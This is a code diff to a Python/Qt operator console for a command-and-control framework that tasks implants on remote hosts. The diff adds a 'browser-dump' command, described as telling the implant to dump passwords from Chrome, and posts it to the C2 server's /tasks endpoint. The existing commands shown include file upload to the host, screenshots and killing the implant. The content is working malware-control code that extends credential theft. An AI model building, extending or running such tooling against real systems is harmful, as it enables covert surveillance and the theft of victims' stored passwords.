@@ -13,7 +13,7 @@ from time import sleep
 BR, FT, FR, FG, FY, FB, FM, FC, ST, SD, SB = B.RED, F.RESET, F.RED, F.GREEN, F.YELLOW, F.BLUE, F.MAGENTA, F.CYAN, S.RESET_ALL, S.DIM, S.BRIGHT
 
 # Configuration Settings
-listening_mgr_addr = "http://192.168.1.3:5000"
+listening_mgr_addr = "http://192.168.1.10:5000"
 beacon_IDs = [] # Our beacon array
 BeaconInteraction = False # Our switch between selection of beacons
 beacon_ID = "" # Our var to hold beacon data from list
@@ -155,6 +155,8 @@ class mainWidget(QtWidgets.QWidget):
             self.fileUpload(subCommand)
         if metaCommand == "screenshot" and BeaconInteraction == True:
             self.Screenshot()
+        if metaCommand == "browser-dump" and BeaconInteraction == True:
+            self.browserDumpRun()
 
     def helpMenu(self):
         r1 = "{0:<8s} -   {1}".format("help", "This help menu.")
@@ -166,7 +168,8 @@ class mainWidget(QtWidgets.QWidget):
         r7 = "{0:<8s} -   {1}".format("upload [filename]", "Tells implant to download file from C2 server to host.")
         r8 = "{0:<8s} -   {1}".format("screenshot", "Tells implant to take screenshot")
         r9 = "{0:<8s} -   {1}".format("kill", "Kills the implant")
-        menu = "{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5, r6, r7, r8, r9)
+        r10 = "{0:<8s} -   {1}".format("browser-dump", "Tells implant to dump passwords from chrome")
+        menu = "{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5, r6, r7, r8, r9, r10)
         self.textEdit.append(TextColors.Green(menu))
     
     def clearCommandInput(self):
@@ -272,6 +275,7 @@ class mainWidget(QtWidgets.QWidget):
                     output = re.sub(r'\r$', '', output)
 
                 # self.textEdit.setTextColor(QtGui.QColor('#FF2600'))  # Red
+                print(f"Results: {output}")
                 self.textEdit.append(f"Results: \n{output}")
         except:
             return
@@ -317,6 +321,13 @@ class mainWidget(QtWidgets.QWidget):
         self.textEdit.append("Command has been sent to implant\n")
         api_endpoint = "/tasks"
         request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"screenshot"}}]'
+        request_payload = json.loads(request_payload_string)
+        api_post_request(api_endpoint, request_payload)
+    
+    def browserDumpRun(self):
+        self.textEdit.append("Command has been sent to implant\n")
+        api_endpoint = "/tasks"
+        request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"browser-dump"}}]'
         request_payload = json.loads(request_payload_string)
         api_post_request(api_endpoint, request_payload)
 
